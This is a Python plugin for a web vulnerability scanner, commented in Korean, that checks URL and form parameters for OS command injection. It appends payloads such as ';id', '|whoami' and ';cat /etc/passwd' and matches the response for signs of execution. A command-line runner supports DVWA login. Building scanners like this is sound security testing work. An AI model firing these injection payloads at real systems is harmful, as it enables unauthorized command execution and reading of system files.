"""
- GET/POST 파라미터에 명령어 구분자 (;, &&, |)을 삽입하고,
  시스템 명령 결과를 통해 취약 여부를 판단함.
- DVWA 전용이 아니며, 일반 웹에도 적용 가능.
"""

import re
import urllib.parse
import time

# 패키지/단독 실행 모두 호환되게 import 처리
try:
    from core.s2nscanner.http.client import HttpClient
except ImportError:
    from ..http.client import HttpClient


COMMON_PAYLOADS = [
    ";id", "&&id", "|id", ";whoami", "|whoami",
    ";cat /etc/passwd", "|uname -a", "&whoami",
    "|dir", "&echo vulnerable",
]


def scan(target_url: str, client: HttpClient, method: str = "GET", params=None, options=None) -> dict:
    """
    OS Command Injection 취약점 스캐너
    - target_url: 테스트할 URL (예: http://target.com/page.php)
    - client: HttpClient 인스턴스 (세션/쿠키 포함)
    - method: "GET" 또는 "POST"
    - params: 테스트할 파라미터 이름 리스트 (예: ["ip", "cmd"])
    - options: timeout, verbose 등
    """
    result = {
        "target": target_url,
        "vulnerable": False,
        "payload": None,
        "evidence": None,
        "details": {},
    }

    if params is None:
        params = []
    if options is None:
        options = {}

    timeout = options.get("timeout", 8)
    verbose = options.get("verbose", True)
    method = method.upper()

    if method not in ["GET", "POST"]:
        raise ValueError("method는 GET 또는 POST여야 합니다.")

    try:
        for param in params:
            for payload in COMMON_PAYLOADS:
                test_value = f"test{payload}"

                if method == "GET":
                    parsed = urllib.parse.urlparse(target_url)
                    q = dict(urllib.parse.parse_qsl(parsed.query))
                    q[param] = test_value
                    new_query = urllib.parse.urlencode(q)
                    new_url = parsed._replace(query=new_query).geturl()
                    r = client.get(new_url, timeout=timeout)

                else:
                    data = {param: test_value}
                    r = client.post(target_url, data=data, timeout=timeout)

                text = r.text.lower() if hasattr(r, "text") else ""

                patterns = [
                    r"uid=\d+",
                    r"gid=\d+",
                    r"root:.*:0:0:",
                    r"administrator",
                    r"vulnerable",
                    r"linux",
                    r"ubuntu",
                ]

                for p in patterns:
                    if re.search(p, text):
                        result.update({
                            "vulnerable": True,
                            "payload": payload,
                            "evidence": p,
                            "details": {
                                "parameter": param,
                                "match": p,
                                "method": method,
                                "response_code": r.status_code,
                            },
                        })
                        if verbose:
                            print(f"[+] 취약점 발견: {target_url} (파라미터: {param}, 페이로드: {payload}, 매치: {p})")
                        return result

            if verbose:
                print(f"[-] 취약점 없음: {target_url} (파라미터: {param})")

    except Exception as e:
        result["details"]["error"] = str(e)
        if verbose:
            print(f"[!] 오류 발생: {target_url} - {e}")
    return result


# -------------------------
# 범용 실행 블록 (하드코딩된 링크 없음 — CLI 입력 기반)
# -------------------------
if __name__ == "__main__":
    import json
    import argparse
    import sys
    from urllib.parse import urljoin, urlparse
    from core.s2nscanner.http.client import HttpClient
    from core.s2nscanner.auth.dvwa_adapter import DVWAAdapter

    def pretty_print_result(result: dict, use_color: bool = True):
        GREEN = "\033[92m" if use_color else ""
        YELLOW = "\033[93m" if use_color else ""
        RED = "\033[91m" if use_color else ""
        CYAN = "\033[96m" if use_color else ""
        RESET = "\033[0m" if use_color else ""

        print()
        print(f"{CYAN}=== OS Command Scan Result ==={RESET}")
        print(f"Target : {result.get('target')}")
        vuln = result.get("vulnerable", False)
        if vuln:
            print(f"Status : {GREEN}VULNERABLE{RESET}")
            print(f"Payload: {YELLOW}{result.get('payload')}{RESET}")
            print(f"Evidence: {result.get('evidence')}")
        else:
            print(f"Status : {RED}not vulnerable{RESET}")
        details = result.get("details", {}) or {}
        if details:
            print(f"Details: ")
            for k, v in details.items():
                print(f"  - {k}: {v}")
        print(f"{CYAN}=============================={RESET}")
        print()

    def save_result_json(result: dict, path: str):
        with open(path, "w", encoding="utf-8") as f:
            json.dump(result, f, ensure_ascii=False, indent=2)
        print(f"[INFO] 결과를 JSON으로 저장했습니다: {path}")

    parser = argparse.ArgumentParser(
        description="oscommand 플러그인: 범용 OS-Command-Injection 스캐너 (절대/상대 URL 모두 지원)"
    )
    # targets: 절대 URL 또는 상대경로 여러개 (쉼표로 구분)
    parser.add_argument("--targets", help="대상 URL 또는 경로(쉼표구분). 절대 URL을 주면 base 무시. 예: http://a/x, vulnerabilities/exec/", required=True)
    parser.add_argument("--base", help="(상대경로 사용 시) base URL, 예: http://localhost/dvwa", required=False)
    parser.add_argument("--user", help="(인증용) username (선택)", required=False)
    parser.add_argument("--pass", dest="password", help="(인증용) password (선택)", required=False)
    parser.add_argument("--params", help="테스트할 파라미터 이름들 (쉼표구분). 기본: ip", default="ip")
    parser.add_argument("--timeout", type=int, help="request timeout (초)", default=5)
    parser.add_argument("--no-color", action="store_true", help="터미널 색상비활성화")
    parser.add_argument("--save", help="JSON 저장 경로 (선택)", default=None)
    args = parser.parse_args()

    # 파싱: targets, params
    raw_targets = [t.strip() for t in args.targets.split(",") if t.strip()]
    params = [p.strip() for p in args.params.split(",") if p.strip()]

    # Http client 준비
    client = HttpClient()

    # 인증정보가 주어지면 adapter로 로그인 시도 (선택적)
    if args.user:
        if not args.password:
            print("[ERROR] --user 주면 --pass(또는 --password)를 함께 입력하세요.")
            sys.exit(1)
        # adapter는 DVWA 전용이지만, 프로젝트에서 인증 흐름을 통일할 목적으로 사용 가능
        adapter = DVWAAdapter(base_url=args.base or "")
        print(f"[INFO] 로그인 시도: {args.user}/(hidden) -> base: {args.base}")
        try:
            used = adapter.authenticate(client, [(args.user, args.password)])
            if not used:
                print("[WARN] 인증 실패 또는 인증 필요 없음 (계속 진행)")
            else:
                print(f"[INFO] 인증 성공: {used}")
            print(f"[INFO] 세션 쿠키: {client.s.cookies.get_dict()}")
        except Exception as e:
            print(f"[WARN] 인증 시 예외 발생: {e} — 계속 진행합니다.")

    results = []

    # 각 target 처리: 절대 URL이면 그대로, 아니면 base와 결합
    for t in raw_targets:
        if t.lower().startswith("http://") or t.lower().startswith("https://"):
            full_target = t
        else:
            if not args.base:
                print(f"[ERROR] 상대경로 대상 '{t}' 사용 시 --base를 지정해야 합니다.")
                sys.exit(1)
            # base가 비어있지 않도록 보장
            base_with_slash = args.base if args.base.endswith("/") else args.base + "/"
            full_target = urljoin(base_with_slash, t)

        print(f"[INFO] 스캔 대상: {full_target} (params: {params})")
        res = scan(full_target, client, method="GET", params=params, options={"timeout": args.timeout, "verbose": True})
        # 대상별 메타 추가
        res["_scanned_at"] = time.strftime("%Y-%m-%d %H:%M:%S")
        results.append(res)
        # 보기 좋은 출력 (각 대상별)
        pretty_print_result(res, use_color=not args.no_color)

    # 결과 종합: 단일 파일로 저장하거나 단일 출력
    if args.save:
        # 여러 대상을 리스트로 저장
        out = {"generated_at": time.strftime("%Y-%m-%d %H:%M:%S"), "results": results}
        save_result_json(out, args.save)
    else:
        print("[INFO] --save 미지정: 파일 저장 없이 표준 출력으로만 결과 제공.")